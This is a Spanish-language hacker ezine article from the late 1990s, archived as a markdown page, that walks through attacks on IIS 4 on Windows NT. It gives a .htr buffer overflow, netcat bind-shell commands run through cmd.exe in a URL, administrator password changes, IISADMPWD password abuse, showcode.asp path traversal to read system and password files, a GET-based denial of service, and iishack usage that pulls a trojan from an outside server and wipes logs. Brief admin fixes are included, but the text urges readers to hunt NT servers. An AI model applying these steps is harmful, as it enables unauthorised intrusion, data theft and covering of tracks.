@@ -1,0 +1,305 @@
+---
+title: "heh2-03"
+ezine: "heh"
+---
+
+# heh2-03
+
+**Ezine:** heh
+
+<div className="ascii-content">
+
+```
+      =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      =- IIS - Internet Information Server -=
+      =-=-=-=-=-=-=-=-           -=-=-=-=-=-= 
+		      =- Nw2o  -=
+                        -=-=-=-	
+
+
+ Internet Information Server es el ·nico servidor WEB integrado con NT Server, 
+que da la plataforma mßs potente disponible para negocios en la WEB.
+                
+			 // Que graciosa esa descripci≤n no ;)
+ IIS estß incluido con Windows NT Server.
+ El procedimiento de instalaci≤n estß completamente integrado con Windows 
+NT Server. Un asistente le guφa durante la instalaci≤n, asegurando que su 
+sitio WEB estΘ ejecutßndose en minutos.
+Todas las labores de gesti≤n y configuraci≤n se realizan con las mismas 
+herramientas de administraci≤n de Windows NT Server, por lo que no tiene 
+que aprender nuevas herramientas y utilidades. Hay tambiΘn una herramienta 
+de administraci≤n basada en HTML para la gesti≤n remota de su servidor */
+
+ 	// El IIS, no es tan asi como parece tan seguro y confiable pero como 
+        // era de esperar tambien traen un par de fallas, por lo que voy a
+        // tratar de explicar la forma de explotarlas.   
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Sobrecarga del Buffer
+---------- --- ------
+
+Este fallo esta en los servidores Windows NT con IIS 4 (option pack 4). Con 
+este fallo podemos conseguir la baja del servicio y hasta la posibilidad de 
+ejecutar codigo remotamente a travez del servidor web.
+
+Si se envia una orden "GET /[sobrecarga].htr HTTP/1.0", donde [sobrecarga] es 
+una cadena de unos 3 Kbytes, el IIS (Internet Information Server) trata de leer
+la pagina solicitada, pero la isapi.dll no hace un chequeo apropiado del tamano
+causando una sobrecarga. El fallo es en relacion a las paginas de extension 
+.htr. Este tipo de paginas permite a los usuarios de Windows NT modificar su 
+password a traves del servidor web en el directorio /iisadmpwd/. Para hacer 
+posible la actualizacion del password se habilitan unas paginas htr y la dll 
+ism.dll de extension isapi. (Este filtro se instala por defecto con el IIS 4).
+
+Para explotar este fallo lo que vamos a hacer es usar un NetCat especial 
+llamado ncx que ha sido modificado por la gente de eEye, para que el mismo, 
+solo se ejecute con la sintaxis  -l -p 80 -t -e cmd.exe, por lo que el NC 
+(NetCat) esta comprometiendo permanentemente al cmd.exe en el puerto 80. 
+Despues de hacer esto tenemos que abrir un telnet al puerto 80 y si todo sale
+bien conseguiremos una shell con permisos de administrador.
+
+*******************************************************************************
+Administradores: Para poder correguir este error solo tienen que desabilitar la
+opcion del htr, en las opciones del servidor de web IIS.
+
+Si necesitan la informacion especifica para resolver este problema vayan a la 
+web de microsoft y sino instalen un Unix que es lo mejor que pueden hacer ;)
+*******************************************************************************
+ 
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Fuerza Bruta con el NetBios
+------ ----- --- -- -------
+
+Explotando este fallo podemos conseguir que un atacante con acceso remoto a un 
+directorio con permisos de escritura y ejecucion, modifique cualquier password,
+incluido el del administrador.
+
+Lo primero, debemos tener acceso a un directorio del servidor donde se puedan 
+ejecutar comandos. Esto puede conseguirse con un ataque por fuerza bruta a 
+travez del NetBios, FTP, ColdFusion, o cualquier otra debilidad que permita 
+cambiar el password de un usuario.
+
+Tendremos que subir al servidor web el archivo nc.exe, y el cmd.exe, puede ser 
+al cgi-bin, scripts, iisadmpwd, o cualquier otro directorio parecido.
+
+Ahora tendremos que ejecutar en el navegador la siguiente sintaxis:
+
+http://www.servidor.com/cgi-bin/cmd.exe?/c cgi-bin\nc.exe -L -p 10000 -t -e 
+cmd.exe
+
+Si falla abra que cambiar los espacios en blanco por un %20, lo que hacemos 
+con esto es poder abrir una shell en el puerto 1000, por lo que lo que 
+tenemos que hacer ahora es telnetearnos al puerto 1000, con lo que conseguiremos
+acceder al directorio cgi-bin del server.
+
+El fallo funcionara si el administrador o algun usuario que tenga los permisos
+necesarios establecido el Net Stop Server. Entonces ponemos net start server, si
+todo sale bien podremos iniciar el servicio, tambien podremos poner net user 
+administrator nueva password, y conseguiremos cambiar la password del 
+administrador.
+
+Si el servicio netlogon se inicia al poner net start server, podremos probar 
+poniendo net start netlogon, y podremos mapear cualquier maquina con la nuestra.
+Tras hacer todo esto, podremos modificar las cuentas del administrador y de los
+usuarios, y controlar remotamente el IIS.
+
+Para hacer esto habilitamos nuevamente una shell desde el navegador, pero 
+esta vez como administrador, con esto podremos controlar la maquina remota y 
+utilizar una amplia lista de servicios y utilidades ;)
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Administracion Web (IISADMPWD)
+-------------- --- -----------
+
+Una de las principales caracteristicas del Windows NT, es que trae una utilidad
+que permite cambiar los passwords de los usuarios a travez del navegador. Y lo 
+bueno que tiene esto es que permite acceso a cualquier usuario de forma anonima.
+Con esto podremos comprometer los passwords de los usuarios locales.
+
+El fallos se produce porque durante la instalacion del servidor se elige la 
+opcion de Administracion Web por lo que se crea el directorio virtual
+/IISADMPWD. Este directorio contiene varios ficheros .htr, a los cuales puede 
+acceder cualquier usuario anonimo sin restriccion a la direccion local 
+127.0.0.1. El directorio /IISADMPWD se encuentra fisicamente en la ruta 
+c:\winnt\system32\inetsrv\iisadmpwd.
+
+Los archivos contenidos en el directorio /iisadmpwd permiten a un usuario 
+cambiar su passwd a travez de una pagina web, pero esto tambien puede ser usado
+por un intruso. Por ejemplo si ponemos un nombre de usuario y el mismo no 
+existe nos devolvera invalid domain (Dominio Invalido), pero si existe y la 
+passwd es la que esta erronea nos lo hara saber.
+
+Si ponemos una direccion ip y una barra invertida (\) y el nombre de usuario, 
+el server nos conectara con el NetBios e intentara cambiar la passwd del 
+usuario. 
+
+Para terminar digo que el archivo aexp3.htr contiene un formulario, que nos 
+pide el user, el passwd antiguo y el nuevo. Si colocamos todos los datos 
+correctos podremos cambiar la passwd de dicho usuario.
+
+*******************************************************************************
+Administradores: Para poder solucionar este problema directamente borren el 
+directorio virtual /IISADMPWD, y sino controlen el trafico con el NetBios, u 
+algo mejor instalen Unix ;)
+*******************************************************************************
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Aprovecharse de los archivos de ejemplo (en este caso showcode.asp)
+------------ -- --- -------- -- ------- ---------------------------
+
+ Se ha descubierto un archivo de ejemplo dentro de IIS, a traves del cual se 
+puede visualizar cualquier archivo que exista en el sistema. 
+ IIS trae archivos de ejemplo, los cuales se pueden utilizar para otros
+metodos. 
+Uno de estos ejemplos son los ejemplos de asp (dentro de paginas webs) que 
+sirven para que los desarrolladores de paginas web aprendan a realizar 
+aplicaciones web.  El archivo que usaremos aca va a ser el showcode.asp que fue 
+dise±ado para visualizar el c≤digo fuente de las pßginas a travΘs de un 
+navegador. Showcode.asp acepta el nombre de una pagina web como parametro, por 
+lo que mostrara el codigo de la pßgina. 
+
+Pero la seguridad incorporada en showcode.asp no es de lo mejorcito (por 
+suerte ;)) y permite a cualquier usuario, a travΘs de su navegador web 
+visualizar el contenido de cualquier fichero del servidor web, incluyendo los 
+que se encuentren fuera del directorio de documentos del servidor. Muchas 
+servidores comerciales guardan datos en forma de txt, como numeros de tarjetas 
+de credito, direcciones, nombres, tambien base de datos, etc., o sea que
+podremos tener acceso a ellos, y hasta el archivo de password del NT ;).
+
+Showcode.asp se instala por defecto en la URL: 
+
+http://www.servidor.com/msadc/Samples/SELECTOR/showcode.asp y toma como 
+parametro el nombre del archivo a visualizar. O sea ...
+source=/ruta/nombre_archivo 
+
+Ejemplo: 
+
+http://www.servidor.com/msadc/Samples/SELECTOR/showcode.asp?source=
+/msadc/Samples/SELECTOR/showcode.asp
+
+Lo que ha pasado aca es que el autor de la web, a puesto permisos para que 
+solo se pueda visualizar los archivos dentro del directorio /msadc, pero se 
+olvido de que existen los ".." para bajar de directorio, por que podremos 
+ver todo el contenido del server ;).
+
+Por ejemplo, una URL que visualize el archivo boot.ini 
+
+http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=
+/msadc/Samples/../../../../../boot.ini
+
+Si se ha instalado en Windows NT por defecto va a ser facil encontrar los 
+archivos y directorios deseados (/msadc, passwd, etc.).
+
+
+*******************************************************************************
+Adminitradores: Para poder solucionar este problema, que se les ocurre ???.
+Perdon cierto que alguien que elige NT antes que Unix no piensa, bueno se los 
+digo yo. Borren los ejemplos y/o al instalar NT elijan sin ejemplos.
+*******************************************************************************
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+DoS rapidito y facil.
+--- -------- - -----
+
+Ahora se viene el turno de un DoS que esta bastante bueno y es muy choto 
+hacerlo. Lo que tienen que hacer es conectar por telnet al pueto 80 de un NT 
+y poner la orden "GET /AAAAAAAAAAA&" (GET es un comando del http). Lo que hace 
+aca el NT es ir procesando la peticion de A y va a usar como buffer a la RAM, 
+y cuando esta no le permite mas, empieza a copiar el contenido del buffer al 
+disco por lo que se cae el sistema.
+
+Esto muestra el servidor cuando conectemos al puerto 80 en un NT:
+
+HTTP/1.1 400 Bad Request
+Server: Microsoft-IIS/4.0
+Date: Tue, 12 Jan 1999 23:52:35 GMT
+Conten-Type: text/html
+Content-Length: 87
+
+*******************************************************************************
+Administradores: Bueno, y ahora que tul ???, se convencieron de lo que es NT?
+vayan a la web de microsoft y bajen el parche que hace que cuando se llega a 
+2mb, baja la transmicion por lo que corta la sesion.
+*******************************************************************************
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+IISHACK
+-------
+
+El team eeyE security team a creado una herramienta capaz de conseguir una 
+shell remotamente en lo servidores NT que corra el IIS - 4 y el ISS 3 con
+el resources kit 4. 
+
+Veamos un ejemplo de lo que tira este file ...
+
+iishack example.com 80 ourserver.com/ncx.exe
+      ------(IIS 4.0 remote buffer overflow exploit)-----------------
+      (c) dark spyrit -- barns@eeye.com.
+      http://www.eEye.com
+
+      [usage: iishack &lt;host> &lt;port> &lt;url> ]
+      eg - iishack www.example.com 80 www.myserver.com/thetrojan.exe
+      do not include 'http://' before hosts!
+      ---------------------------------------------------------------
+
+      Data sent!
+
+      Note: Give it enough time to download your trojan.
+
+      X:\Code>telnet example.com 80
+
+      Microsoft(R) Windows NT(TM)
+      (C) Copyright 1985-1996 Microsoft Corp.
+
+      C:\>[You have full access to the system, happy browsing :)]
+      C:\>[Add a scheduled task to restart inetinfo in X minutes]
+      C:\>[Add a scheduled task to delete ncx.exe in X-1 minutes]
+      C:\>[Clean up any trace or logs we might have left behind.]
+      C:\>exit
+
+Como podrßn observar la forma de usarlo es sencilla se tiene que colocar:
+
+iishack www.loquesea.com 80 www.nightwoolf.com/ncx.exe o ncx99.exe para abrir 
+el puerto 99.
+
+Bueno, busquen serbidores NT que hay bastantes ...
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Aca termina este txt, que espero que les sirva de ayuda y entiendan sin 
+problemas.
+
+Un saludo a mi amigo Zomba y a todo Digital Rebel ... ;)
+
+A muchachos, si no hackean un NT con esto ... mmm mandenme un mail ahahahahahah
+
+Bueno, criticas, choteras y todo lo demas a nwoolf@softhome.net
+
+
+
+  <<< EL QUE CREE SER EL MAS SABIO DE TODOS, ES EL MAS IGNORANTE DE TODOS >>>
+
+ooooo      ooo oooooo   oooooo     oooo   .oooo.     .oooooo.
+`888b.     `8'  `888.    `888.     .8'  .dP""Y88b   d8P'  `Y8b
+8 `88b.    8    `888.   .8888.   .8'         ]8P' 888      888
+8   `88b.  8     `888  .8'`888. .8'        .d8P'  888      888
+8     `88b.8      `888.8'  `888.8'       .dP'     888      888
+8       `888       `888'    `888'      .oP     .o `88b    d88'
+o8o        `8        `8'      `8'       8888888888  `Y8bood8P'
+
+```
+
+</div>
